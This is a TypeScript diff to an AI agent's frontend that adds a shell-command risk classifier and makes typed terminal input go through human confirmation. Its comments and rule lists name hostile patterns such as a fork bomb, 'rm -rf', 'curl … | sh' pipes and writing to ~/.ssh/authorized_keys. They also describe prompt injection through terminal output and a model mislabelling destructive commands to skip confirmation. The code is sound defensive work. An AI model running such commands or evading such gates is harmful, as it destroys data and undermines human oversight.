@@ -80,11 +80,383 @@ type RiskLevel = 'read' | 'write' | 'dangerous'
 
 export const VALID_RISK: readonly RiskLevel[] = ['read', 'write', 'dangerous']
 
+// ── 规则说明（前后端共用，必须与 backend/mcp/risk.go 以及
+//    backend/mcp/risk_test.go / 本文件测试的注释保持逐条一致）──────────────────
+//
+// RISK RULES v1 — backend/mcp/risk.go == frontend/src/services/agent.ts
+//
+// 0. 空命令/缺失命令 → dangerous（默认关闭）。
+// 1. 整行包含 ":|:" 或 "|:&"（小写）→ dangerous（fork bomb，先于分割判断）。
+// 2. 整行按 `;`、换行、`|`、`&` 分割为若干段；重定向内部的 `&` 不是分隔符
+//    （`2>&1`、`>&2`、`&>file` 不切割）。
+// 3. 每段（匹配时小写；head 逐 token 归一）：
+//    a. 剥 wrapper（始终保留 ≥1 个 token，绝不越界）：环境变量赋值（token 含
+//       `=`）、sudo/doas 及其选项词（-u/-g/-p/-C/-U/-r/-t/-h/-D 与
+//       --user/--group/--prompt/--host/--role/--type/--chdir，带单独参数的
+//       选项连同参数一起跳过）、nohup、time、nice、env、command、exec。
+//       仅剩一个赋值 token 时判 read（不执行任何命令）。
+//    b. head 归一：去引号、去前导 `\`、`\`→`/`、取 basename、小写、去 `.exe`
+//       （覆盖 `/bin/rm -rf /`、`\rm -rf`、`command rm -rf`、C:\...\rm.exe）。
+//    c. 嵌套 shell 代码 —— `$( … )`、反引号、`eval …`、`<shell> -c/-e …`
+//       （sh/bash/zsh/dash/ash/ksh/csh/tsh/fish/cmd/powershell/pwsh/python/
+//       node/perl/ruby）、`xargs <cmd>`、`find -exec/-execdir <cmd>` —— 递归按
+//       本规则分类，结果至少 write；内层 dangerous 直接判 dangerous。
+//    d. dangerous：`rm` 带递归+强制（-rf/-fr 或 -r 与 -f 分写）、mkfs*、
+//       `dd of=/dev/*`、shutdown/reboot/halt/poweroff/init/fdisk/parted/wipefs/
+//       shred、`find -delete`、重定向目标位于 /etc /boot /sys /dev /proc/sys
+//       之下（/dev/null 豁免）、cp/mv/tee/install/rsync/dd/truncate 的文件
+//       参数位于上述危险路径。
+//    e. 每个重定向目标单独判定：`/dev/null` 忽略，其余目标至少 write
+//       （`echo k >> ~/.ssh/authorized_keys 2>/dev/null` 必须非 read）。
+//    f. 只读放行：head 在 READ_HEADS 中，或 head 在 READ_SUBS 中且第二个
+//       token 是列出的只读子命令（git status、kubectl get、systemctl
+//       status…），且没有其它 write 信号 → read；**其它任何命令默认至少
+//       write**。
+// 4. 整行 `curl|wget|fetch … | sh|bash|zsh|sudo sh|sudo bash` → dangerous
+//    （classifyDownloadPipe，由调用方叠加）。
+//
+// The model is untrusted: its self-reported `risk` may only RAISE the local
+// grade, never lower it (see getRisk).
+
+const RISK_ORDER: Record<RiskLevel, number> = { read: 0, write: 1, dangerous: 2 }
+
+/** classifyCommand grades a shell command line (RISK RULES v1). */
+export function classifyCommand(cmd: string): RiskLevel {
+  if (!cmd.trim()) return 'dangerous' // default closed
+  const low = cmd.toLowerCase()
+  if (low.includes(':|:') || low.includes('|:&')) return 'dangerous'
+  let overall: RiskLevel = 'read'
+  for (const seg of splitSegments(cmd)) {
+    const r = classifySegment(seg)
+    if (r === 'dangerous') return 'dangerous'
+    if (r === 'write') overall = 'write'
+  }
+  return overall
+}
+
+/** Split on ;, newline, | and & — but not on '&' inside a redirection. */
+function splitSegments(cmd: string): string[] {
+  const segs: string[] = []
+  let start = 0
+  for (let i = 0; i < cmd.length; i++) {
+    const c = cmd[i]
+    if (c === ';' || c === '\n' || c === '|') {
+      segs.push(cmd.slice(start, i))
+      start = i + 1
+      continue
+    }
+    if (c === '&') {
+      const prev = i > 0 ? cmd[i - 1] : ''
+      const next = i + 1 < cmd.length ? cmd[i + 1] : ''
+      if (prev === '>' || next === '>') continue // fd dup or "&>"
+      segs.push(cmd.slice(start, i))
+      start = i + 1
+    }
+  }
+  segs.push(cmd.slice(start))
+  return segs
+}
+
+const WRAPPERS: Record<string, true> = {
+  sudo: true, doas: true, nohup: true, time: true, nice: true, env: true,
+  command: true, exec: true,
+}
+
+// sudo/doas options that take a separate argument: the argument is skipped
+// together with the option ("sudo -u root rm" must judge "rm", not "-u").
+const PRIV_OPTION_ARGS: Record<string, true> = {
+  '-u': true, '-g': true, '-p': true, '-C': true, '-U': true, '-r': true,
+  '-t': true, '-h': true, '-D': true, '--user': true, '--group': true,
+  '--prompt': true, '--host': true, '--role': true, '--type': true,
+  '--chdir': true,
+}
+
+const XARGS_OPTION_ARGS: Record<string, true> = {
+  '-n': true, '-P': true, '-d': true, '-a': true, '-L': true, '-s': true,
+  '-I': true, '-E': true, '--max-args': true, '--max-procs': true,
+  '--delimiter': true, '--arg-file': true, '--max-chars': true,
+  '--replace': true, '--initial': true,
+}
+
+/** Interpreters that execute a code string passed through an option. */
+const EVAL_FLAG_HEADS: Record<string, string[]> = {
+  sh: ['-c'], bash: ['-c'], zsh: ['-c'], dash: ['-c'], ash: ['-c'],
+  ksh: ['-c'], csh: ['-c'], tcsh: ['-c'], fish: ['-c'],
+  cmd: ['/c', '-c'], powershell: ['-c', '-command'], pwsh: ['-c', '-command'],
+  python: ['-c'], python3: ['-c'], node: ['-e', '--eval'],
+  perl: ['-e'], ruby: ['-e'],
+}
+
+const DANGER_HEADS: Record<string, true> = {
+  mkfs: true, shutdown: true, reboot: true, halt: true, poweroff: true,
+  init: true, fdisk: true, parted: true, wipefs: true, shred: true,
+}
+
+const DANGEROUS_PATHS = ['/etc/', '/boot/', '/sys/', '/dev/', '/proc/sys/']
+
+const REDIRECT_SEP: Record<string, true> = {
+  ' ': true, '\t': true, '\n': true, ';': true, '|': true, '&': true,
+  '<': true, '>': true, '(': true, ')': true,
+}
+
+/** Drop leading option words, consuming their separate arguments. */
+function skipOptions(words: string[], argTakers: Record<string, true>): string[] {
+  const out = words.slice()
+  while (out.length > 1 && out[0].startsWith('-')) {
+    const w = out[0].toLowerCase()
+    out.shift()
+    if (!w.includes('=') && argTakers[w]) out.shift()
+  }
+  return out
+}
+
+/**
+ * Strip env assignments and privileged/nohup wrappers so "sudo -u root rm" is
+ * judged as "rm". Always keeps at least one token: a bare wrapper word can
+ * never run past the end of the list.
+ */
+function stripWrappers(words: string[]): string[] {
+  let rest = words.slice()
+  while (rest.length > 1 && (WRAPPERS[rest[0].toLowerCase()] || (rest[0].includes('=') && !/[<>]/.test(rest[0])))) {
+    const w = rest[0].toLowerCase()
+    rest.shift()
+    if (w === 'sudo' || w === 'doas') rest = skipOptions(rest, PRIV_OPTION_ARGS)
+  }
+  return rest
+}
+
+/** Quotes dropped, '\' folded to '/', basename, lowercase, ".exe" stripped. */
+function normalizeHead(head: string): string {
+  let h = head.trim().replace(/^['"]+|['"]+$/g, '')
+  h = h.replace(/^\\+/, '').replace(/\\/g, '/')
+  const i = h.lastIndexOf('/')
+  if (i >= 0) h = h.slice(i + 1)
+  h = h.toLowerCase()
+  return h.endsWith('.exe') ? h.slice(0, -4) : h
+}
+
+/** Command substitutions: bodies of $( … ) and ` … ` spans. */
+function substitutions(seg: string): string[] {
+  const out: string[] = []
+  for (let i = 0; i < seg.length; i++) {
+    if (seg[i] === '$' && seg[i + 1] === '(') {
+      let depth = 1
+      let j = i + 2
+      while (j < seg.length && depth > 0) {
+        if (seg[j] === '(') depth++
+        else if (seg[j] === ')') depth--
+        j++
+      }
+      out.push(seg.slice(i + 2, j))
+      i = j - 1
+      continue
+    }
+    if (seg[i] === '`') {
+      const end = seg.indexOf('`', i + 1)
+      if (end >= 0) {
+        out.push(seg.slice(i + 1, end))
+        i = end
+      } else {
+        out.push(seg.slice(i + 1))
+        i = seg.length
+      }
+    }
+  }
+  return out
+}
+
+/** Embedded shell code: substitutions, interpreter -c, eval, xargs, find -exec. */
+function nestedSnippets(seg: string, head: string, words: string[]): string[] {
+  const out: string[] = substitutions(seg)
+  const flags = EVAL_FLAG_HEADS[head]
+  if (flags) {
+    for (let i = 1; i < words.length; i++) {
+      if (flags.includes(words[i].toLowerCase()) && i + 1 < words.length) {
+        out.push(words.slice(i + 1).join(' '))
+        break
+      }
+    }
+  }
+  if (head === 'eval' && words.length > 1) out.push(words.slice(1).join(' '))
+  if (head === 'xargs') {
+    const rest = skipOptions(words.slice(1), XARGS_OPTION_ARGS)
+    if (rest.length > 0) out.push(rest.join(' '))
+  }
+  if (head === 'find') {
+    for (let i = 0; i < words.length; i++) {
+      if ((words[i] === '-exec' || words[i] === '-execdir') && i + 1 < words.length) {
+        out.push(words.slice(i + 1).join(' '))
+        break
+      }
+    }
+  }
+  return out
+}
+
+/** File targets of the segment's redirections (fd dups / quotes excluded). */
+function redirectTargets(seg: string): string[] {
+  const targets: string[] = []
+  for (let i = 0; i < seg.length; i++) {
+    const c = seg[i]
+    if (c === "'" || c === '"') {
+      i++
+      while (i < seg.length && seg[i] !== c) i++
+      continue
+    }
+    if (c !== '>') continue
+    let j = i + 1
+    while (j < seg.length && seg[j] === '>') j++
+    if (seg[j] === '|') j++ // ">|" noclobber
+    while (j < seg.length && (seg[j] === ' ' || seg[j] === '\t')) j++
+    if (seg[j] === '&') { // "2>&1" / ">&2"
+      j++
+      while (j < seg.length && seg[j] >= '0' && seg[j] <= '9') j++
+      i = j - 1
+      continue
+    }
+    const start = j
+    while (j < seg.length && !REDIRECT_SEP[seg[j]]) j++
+    if (start < j) {
+      targets.push(seg.slice(start, j).toLowerCase().replace(/^['"]+|['"]+$/g, ''))
+    }
+    i = j - 1
+  }
+  return targets
+}
+
+const READ_HEADS: Record<string, true> = {
+  // POSIX / Unix-like inspection
+  ag: true, ack: true, basename: true, cat: true, cd: true, cmp: true,
+  column: true, cut: true, date: true, df: true, diff: true, dirname: true,
+  dig: true, du: true, echo: true, egrep: true, env: true, false: true,
+  file: true, find: true, fgrep: true, free: true, grep: true, groups: true,
+  head: true, hexdump: true, history: true, host: true, hostname: true,
+  id: true, journalctl: true, jq: true, jobs: true, less: true, ls: true,
+  lscpu: true, lsof: true, lsblk: true, man: true, md5sum: true, more: true,
+  netstat: true, nproc: true, nslookup: true, od: true, ping: true,
+  printenv: true, printf: true, ps: true, pwd: true, readlink: true,
+  realpath: true, rg: true, seq: true, sha1sum: true, sha256sum: true,
+  shasum: true, sleep: true, sort: true, ss: true, stat: true, strings: true,
+  tail: true, test: true, top: true, traceroute: true, tr: true, tree: true,
+  true: true, tty: true, type: true, uname: true, uniq: true, uptime: true,
+  wc: true, who: true, whereis: true, whoami: true, xxd: true,
+  // Windows / PowerShell inspection
+  dir: true, 'format-list': true, 'format-table': true,
+  'get-childitem': true, 'get-command': true, 'get-computerinfo': true,
+  'get-content': true, 'get-date': true, 'get-item': true, 'get-process': true,
+  'get-service': true, ipconfig: true, 'measure-object': true,
+  'out-string': true, 'select-string': true, systeminfo: true, tasklist: true,
+  'test-path': true, ver: true, 'where-object': true,
+}
+
+/** Read-only subcommands of multi-action tools (everything else ≥ write). */
+const READ_SUBS: Record<string, string[]> = {
+  git: ['status', 'log', 'diff', 'show', 'blame', 'grep', 'rev-parse', 'describe', 'ls-files', 'shortlog', 'reflog', 'version', 'help'],
+  kubectl: ['get', 'describe', 'logs', 'top', 'version', 'explain', 'api-resources', 'api-versions', 'cluster-info'],
+  docker: ['ps', 'images', 'logs', 'inspect', 'version', 'info', 'stats', 'top', 'port', 'history', 'diff', 'events', 'df', 'search'],
+  podman: ['ps', 'images', 'logs', 'inspect', 'version', 'info', 'stats', 'top', 'port', 'history', 'diff', 'events', 'df', 'search'],
+  systemctl: ['status', 'is-active', 'is-enabled', 'is-failed', 'list-units', 'list-unit-files', 'list-timers', 'list-sockets', 'show', 'cat', 'get', 'help'],
+  service: ['status'],
+  apt: ['list', 'search', 'show', 'policy', 'check', 'depends'],
+  'apt-get': ['list', 'search', 'show', 'policy', 'check', 'depends'],
+  dnf: ['list', 'info', 'search', 'provides', 'repolist', 'check-update'],
+  yum: ['list', 'info', 'search', 'provides', 'repolist', 'check-update'],
+  pip: ['list', 'show', 'freeze', 'check', 'debug'],
+  pip3: ['list', 'show', 'freeze', 'check', 'debug'],
+  npm: ['ls', 'list', 'view', 'info', 'outdated', 'search', 'why', 'ping', 'audit', 'root', 'prefix'],
+  yarn: ['ls', 'list', 'view', 'info', 'outdated', 'search', 'why', 'ping', 'audit'],
+  pnpm: ['ls', 'list', 'view', 'info', 'outdated', 'search', 'why', 'ping', 'audit'],
+  brew: ['list', 'search', 'info', 'outdated', 'deps', 'config', 'doctor'],
+  cargo: ['search', 'info', 'tree', 'metadata', 'verify-project'],
+  gem: ['list', 'query', 'search', 'info', 'dependency'],
+  go: ['version', 'env', 'list', 'doc', 'help'],
+}
+
+function classifySegment(seg: string): RiskLevel {
+  const s = seg.trim()
+  if (!s) return 'read'
+  const words = s.split(/\s+/)
+  const rest = stripWrappers(words)
+  // A lone assignment ("FOO=1") runs no command.
+  if (rest.length === 0 || (rest[0].includes('=') && !/[<>]/.test(rest[0]))) return 'read'
+  const head = normalizeHead(rest[0])
+  const joined = s.toLowerCase()
+  if (joined.includes(':|:') || joined.includes('|:&')) return 'dangerous'
+
+  // Nested shell code grades at least write; a dangerous inner grade wins.
+  let risk: RiskLevel = 'read'
+  for (const inner of nestedSnippets(s, head, words)) {
+    if (!inner.trim()) { risk = 'write'; continue }
+    const r = classifyCommand(inner)
+    if (r === 'dangerous') return 'dangerous'
+    if (RISK_ORDER[r] > RISK_ORDER[risk]) risk = r
+  }
+
+  // rm -rf / mkfs* / dd of=/dev/* / system-kill heads / find -delete
+  const rmWords = words.map(w => w.toLowerCase())
+  if (head === 'rm') {
+    const hasRf = rmWords.some(w => w.includes('-rf') || w.includes('-fr'))
+    const hasF = rmWords.some(w => w === '-f' || w.includes('-f'))
+    if (hasRf || (rmWords.includes('-r') && hasF) || joined.includes('rm -rf')) return 'dangerous'
+  }
+  if (head.startsWith('mkfs') || (head === 'dd' && joined.includes('of=/dev/')) || DANGER_HEADS[head]) {
+    return 'dangerous'
+  }
+  if (head === 'find' && rmWords.includes('-delete')) return 'dangerous'
+
+  for (const target of redirectTargets(s)) {
+    if (target === '/dev/null') continue
+    const t = target.toLowerCase().replace(/^['"]+|['"]+$/g, '')
+    if (DANGEROUS_PATHS.some(d => t.startsWith(d) || t === d.slice(0, -1))) return 'dangerous'
+    risk = 'write'
+  }
+
+  if (['cp', 'mv', 'tee', 'install', 'rsync', 'dd', 'truncate'].includes(head)) {
+    for (const w of rest.slice(1)) {
+      const path = w.toLowerCase().replace(/^['"]+|['"]+$/g, '')
+      if (DANGEROUS_PATHS.some(d => path.startsWith(d) || path === d.slice(0, -1))) return 'dangerous'
+    }
+  }
+
+  // Default closed: only the read allowlist (heads and known read-only
+  // subcommands) may grade read; every other command is at least a write.
+  const subs = READ_SUBS[head]
+  const readOnly = READ_HEADS[head] || (subs !== undefined && words.length >= 2 && subs.includes(words[1].toLowerCase()))
+  if (risk === 'read' && !readOnly) risk = 'write'
+  return risk
+}
+
+/** "curl … | sh" upgrades the whole line to dangerous. */
+function classifyDownloadPipe(cmd: string): boolean {
+  const low = cmd.toLowerCase()
+  if (!low.includes('|')) return false
+  for (const left of ['curl', 'wget', 'fetch']) {
+    if (!low.includes(left)) continue
+    for (const right of ['| sh', '|sh', '| bash', '|bash', '| zsh', '|zsh', '| sudo sh', '| sudo bash']) {
+      if (low.includes(right)) return true
+    }
+  }
+  return false
+}
+
+/**
+ * getRisk grades a tool call locally (RISK RULES v1, mirrored from
+ * backend/mcp/risk.go). The model's self-reported `risk` may only raise the
+ * level — an injected model labeling `rm -rf ~` as "read" no longer skips the
+ * confirmation dialog.
+ */
 export function getRisk(tu: { name: string; input: Record<string, unknown> }): RiskLevel {
   if (tu.name !== 'execute_command' && tu.name !== 'start_command') return 'dangerous'
-  const risk = tu.input.risk
-  if (risk === 'read' || risk === 'write' || risk === 'dangerous') return risk
-  return 'dangerous' // default-closed: unknown / missing / wrong-typed → dangerous
+  const cmd = typeof tu.input.command === 'string' ? tu.input.command : ''
+  const computed: RiskLevel = !cmd
+    ? 'dangerous'
+    : classifyDownloadPipe(cmd) ? 'dangerous' : classifyCommand(cmd)
+  const claimed = tu.input.risk
+  if (claimed === 'read' || claimed === 'write' || claimed === 'dangerous') {
+    // The model may only RAISE the level, never lower it.
+    return RISK_ORDER[claimed] > RISK_ORDER[computed] ? claimed : computed
+  }
+  return computed
 }
 
 function shouldConfirm(risk: RiskLevel): boolean {
@@ -921,6 +1293,42 @@ export async function runAgent(userInput: string, skillName?: string, skillBody?
       const input = validated.input
       const control = validated.control
       const sendEnter = validated.send_enter
+
+      // Control keys (ctrl_c / ctrl_d / enter) only steer the terminal — they
+      // type no shell text, so they skip the gate. Literal input IS typed
+      // into the shell, so it goes through the same confirmation flow as
+      // execute_command with the risk forced to dangerous: terminal output can
+      // carry a prompt injection that makes the model type "curl evil | sh",
+      // and that must never run unattended under any confirm_* mode.
+      if (control === undefined) {
+        const risk: RiskLevel = 'dangerous'
+        if (shouldConfirm(risk)) {
+          store.setPendingCommand({
+            messageId: assistantMsg.id,
+            toolId: tu.id,
+            toolName: tu.name,
+            command: input ?? '',
+            risk,
+            dangerous: true,
+            panel: validated.panel,
+            keyInput: input,
+            sendEnter
+          })
+          store.status = 'confirming'
+          assistantMsg.tool_calls = [{
+            id: tu.id,
+            type: 'function' as const,
+            function: {
+              name: tu.name,
+              arguments: JSON.stringify(tu.input)
+            }
+          }]
+          store.isRunning = false
+          cleanupStreamListeners()
+          return
+        }
+      }
+
       try {
         store.status = 'executing'
         const panelTitle = validated.panel
@@ -1136,6 +1544,14 @@ export async function approveTool(_messageId: string) {
         id: `msg-${Date.now()}`,
         role: 'tool',
         content: capToolResult(result.output || '(command started)'),
+        tool_call_id: cmd.toolId
+      })
+    } else if (cmd.toolName === 'send_terminal_key') {
+      const result = await sendTerminalKey(cmd.keyInput, cmd.keyControl, cmd.sendEnter ?? true, cmd.panel)
+      store.addMessage({
+        id: `msg-${Date.now()}`,
+        role: 'tool',
+        content: capToolResult(result.output || '(input sent)'),
         tool_call_id: cmd.toolId
       })
     } else {
